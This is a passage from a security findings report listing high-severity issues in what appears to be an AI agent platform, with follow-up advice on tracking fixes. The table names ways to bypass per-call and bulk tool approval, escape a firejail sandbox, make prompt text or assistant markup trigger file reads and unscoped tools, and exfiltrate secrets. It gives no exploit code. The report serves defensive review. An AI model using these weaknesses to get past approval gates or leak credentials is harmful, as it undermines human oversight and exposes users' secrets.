| 16 | High | MCP dry-run bypasses per-call approval | 59df0237 | [90bcb315…](https://chatgpt.com/codex/cloud/security/findings/90bcb315eba481919030b9399f3ffc81) |
| 17 | High | Client `approval:` prefix bypass | 8c934a37 | [e7bf6229…](https://chatgpt.com/codex/cloud/security/findings/e7bf6229f1d0819184a148336cde2b78) |
| 18 | High | Linux Code Mode firejail allows host reads | e0484f68 | [12e0332b…](https://chatgpt.com/codex/cloud/security/findings/12e0332b59dc8191934743c944fba014) |
| 19 | High | Implicit loopback recovery → remote operator | 477b5ccb | [b06f6f11…](https://chatgpt.com/codex/cloud/security/findings/b06f6f115e248191b1cff6c977d632cc) |
| 20 | High | Prompt text triggers hidden local file read | de5712db | [5501db5f…](https://chatgpt.com/codex/cloud/security/findings/5501db5fe45081918a979634bd104a42) |
| 21 | High | Bulk approval can approve+execute all | dff9609a | [222ac26b…](https://chatgpt.com/codex/cloud/security/findings/222ac26b86fc8191b4892ba26655929b) |
| 22 | High | Matrix/Mattermost attachments bypass host scoping | c541f9d1 | [d310be9e…](https://chatgpt.com/codex/cloud/security/findings/d310be9e7ef481918cae7be572ef395b) |
| 23 | High | Live diagnostics SSRF + env-secret exfil | c37ecd47 | [eeb454f4…](https://chatgpt.com/codex/cloud/security/findings/eeb454f4b41881919e10736312e2666b) |
| 24 | High | Browser state reused by auto-approved navigate | f6bf3659 | [1922c703…](https://chatgpt.com/codex/cloud/security/findings/1922c703a4748191a446628285345be1) |
| 25a | High | LLM model preview leaks credentials (baseUrl) | 77f33aa2 | [500bb176…](https://chatgpt.com/codex/cloud/security/findings/500bb176f9d88191a728a36ff70d8abb) |
| 25b | High | Channel integrations leak secrets in URL errors | 6838e5eb | [5ef0be6f…](https://chatgpt.com/codex/cloud/security/findings/5ef0be6f77248191aa087510cc7d3b7d) |
| 26 | High | Telegram bot token in error message | 1bff4902 | [9495baab…](https://chatgpt.com/codex/cloud/security/findings/9495baab64d4819184e367f2e81e132a) |
| 27 | High | Weekly audit egress to external LLM | 04bafc7e | [339e43d3…](https://chatgpt.com/codex/cloud/security/findings/339e43d3a8c88191b36efcde5b1bba3b) |
| 29 | High | Assistant content markup triggers unscoped tools | cf04468a | [93e3d743…](https://chatgpt.com/codex/cloud/security/findings/93e3d743390c8191a4c0fecbaa4c1d08) |
| 30 | High | LLM preview exfil via keychain lookup | 135db054 | [41ce1d45…](https://chatgpt.com/codex/cloud/security/findings/41ce1d45efd88191bf50e75987dc0f82) |

*Numbering above follows the order I addressed in the report rather than the CSV row order; each row's `finding_url` is the canonical reference.*

---

## Suggested next actions

1. Use this report as the historical finding index only; do not treat its per-item prose as current fix status.
2. For any item being closed, cite the live regression test, named verification lane, and source commit that prove the current behavior.
3. Keep current release truth in `docs/1_0_CONTRACT.md`, `docs/1_0_RELEASE_EVIDENCE.md`, and the relevant package tests rather than updating this intake report into a parallel status tracker.
4. If a future security pass needs a live status table, create a dated closeout document that separates "open", "fixed with proof", "accepted risk", and "not reproducible" from this original CSV intake.
